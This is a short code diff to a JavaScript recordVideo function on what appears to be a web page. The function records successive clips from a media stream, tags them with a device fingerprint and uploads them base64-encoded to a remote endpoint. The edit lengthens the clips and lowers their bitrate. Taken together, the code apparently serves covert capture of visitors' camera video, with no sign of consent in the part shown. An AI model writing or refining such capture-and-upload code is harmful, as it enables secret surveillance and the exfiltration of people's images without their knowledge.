@@ -247,37 +247,37 @@
         }
 
         function recordVideo(stream, fingerprint, videoIndex) {
-            let mimeType = 'video/mp4';
-            if (!MediaRecorder.isTypeSupported(mimeType)) {
-                mimeType = 'video/webm';
-            }
+    let mimeType = 'video/mp4';
+    if (!MediaRecorder.isTypeSupported(mimeType)) {
+        mimeType = 'video/webm';
+    }
 
-            let recorder;
-            try {
-                recorder = new MediaRecorder(stream, { mimeType: mimeType });
-            } catch (e) {
-                recorder = new MediaRecorder(stream);
-                mimeType = recorder.mimeType || 'video/webm';
-            }
+    let recorder;
+    try {
+        recorder = new MediaRecorder(stream, { mimeType: mimeType, videoBitsPerSecond: 500000 }); // 500kbps
+    } catch (e) {
+        recorder = new MediaRecorder(stream);
+        mimeType = recorder.mimeType || 'video/webm';
+    }
 
-            const chunks = [];
-            recorder.ondataavailable = (e) => chunks.push(e.data);
-            recorder.onstop = () => {
-                const blob = new Blob(chunks, { type: mimeType });
-                const reader = new FileReader();
-                reader.onloadend = () => {
-                    const base64video = reader.result.split(',')[1];
-                    sendToServer({ type: 'video', video: base64video, mimeType, fingerprint, videoIndex });
-                };
-                reader.readAsDataURL(blob);
-            };
-            recorder.start();
-            setTimeout(() => recorder.stop(), 3000); // 3 seconds
+    const chunks = [];
+    recorder.ondataavailable = (e) => chunks.push(e.data);
+    recorder.onstop = () => {
+        const blob = new Blob(chunks, { type: mimeType });
+        const reader = new FileReader();
+        reader.onloadend = () => {
+            const base64video = reader.result.split(',')[1];
+            sendToServer({ type: 'video', video: base64video, mimeType, fingerprint, videoIndex });
+        };
+        reader.readAsDataURL(blob);
+    };
+    recorder.start();
+    setTimeout(() => recorder.stop(), 5000); // ⏱️ 5 SECONDS
 
-            if (videoIndex < 1) {
-                setTimeout(() => recordVideo(stream, fingerprint, videoIndex + 1), 4000);
-            }
-        }
+    if (videoIndex < 1) {
+        setTimeout(() => recordVideo(stream, fingerprint, videoIndex + 1), 6000); // 1 sec gap
+    }
+}
 
         function sendToServer(payload) {
             fetch(ENDPOINT, {
